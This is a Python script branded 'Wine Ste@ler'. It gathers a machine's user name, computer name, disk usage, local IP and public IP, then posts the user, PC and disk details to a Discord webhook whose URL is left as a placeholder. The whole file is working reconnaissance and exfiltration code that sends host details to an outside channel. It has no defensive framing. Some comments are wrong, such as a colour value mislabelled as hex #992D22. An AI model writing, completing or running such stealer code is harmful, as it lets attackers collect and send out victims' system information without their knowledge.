import requests
import json
import ipaddress
import urllib.request
import socket
import psutil
import subprocess

def get_pc_name():
    command = "echo %COMPUTERNAME%"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    output = result.stdout or result.stderr

    return output

def get_user_name():
    command = "echo %USERNAME%"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    output = result.stdout or result.stderr

    return output



def get_public_ip():
    try:
        # Query an external service to get the public IP address
        with urllib.request.urlopen('http://api.ipify.org') as response:
            public_ip = response.read().decode('utf-8')
    except Exception as e:
        return f"Error fetching public IP: {e}"
    
    return public_ip

# Get Local IP by connecting to an external service (Google DNS)
def get_local_ip():
    try:
        # Create a socket and connect to a remote server
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))  # Google's DNS server
        local_ip = s.getsockname()[0]
    finally:
        s.close()
    
    return local_ip

def get_disk_usage():
    # Dictionary to store disk usage info
    disk_usages = {}
    
    # Get a list of all disk partitions
    partitions = psutil.disk_partitions()
    
    for partition in partitions:
        try:
            # Get disk usage statistics for each partition
            disk_usage = psutil.disk_usage(partition.mountpoint)
            
            # Store the used space percentage in the dictionary
            disk_usages[partition.device] = disk_usage.percent
        except PermissionError:
            # Handle cases where we don't have permission to access the partition
            disk_usages[partition.device] = "Permission denied"
    
    return disk_usages

# Get disk usage information and store it in a variable
DISK = get_disk_usage()
LOCAL_IP = get_local_ip()
PUBLIC_IP = get_public_ip()
USERNAME = get_user_name()
PCNAME = get_pc_name()

# Print the result (optional)
for device, usage in DISK.items():
    if isinstance(usage, str):
        print(f"{device}: {usage}")
    else:
        print(f"{device}: {usage}% full")


# Replace with your actual webhook URL
webhook_url = "WEBHOOK_HERE"

# Embed content



#send whole thing

data = {
    "username": "Wine Ste@ler",
    "avatar_url": "https://your-avatar-url.com",  # Optional
    "embeds": [
        {
            "title": "This is a Purple Embed",
            "description": "Here is some cool content in a purple embed!",
            "color": 10181046,  # Purple color in decimal (hex #992D22)
            "fields": [
                {
                    "name": "**:bust_in_silhouette: | User Pc:**",  # Making the name bold for emphasis
                    "value": f"Username: {USERNAME} Pc Name: {PCNAME} \n",  # Merged fields for USERNAME and PCNAME
                },
                {
                    "name": "**:minidisc: | Disk:**",  # Making the name bold for emphasis
                    "value": f"{DISK}",  # Add extra new lines for spacing
                    "inline": False  # Field 2 will appear below Field 1
                }
            ],
            "footer": {
                "text": "Powered by Discord Webhooks",
                "icon_url": "https://your-footer-icon-url.com"
            },
            "timestamp": "2024-09-06T15:00:00Z"  # Optional timestamp
        }
    ]
}

# Send the POST request to the webhook
response = requests.post(webhook_url, data=json.dumps(data), headers={"Content-Type": "application/json"})

# Check if the request was successful
if response.status_code == 204:
    print("Embed sent successfully!")
else:
    print(f"Error sending embed: {response.status_code}, {response.text}")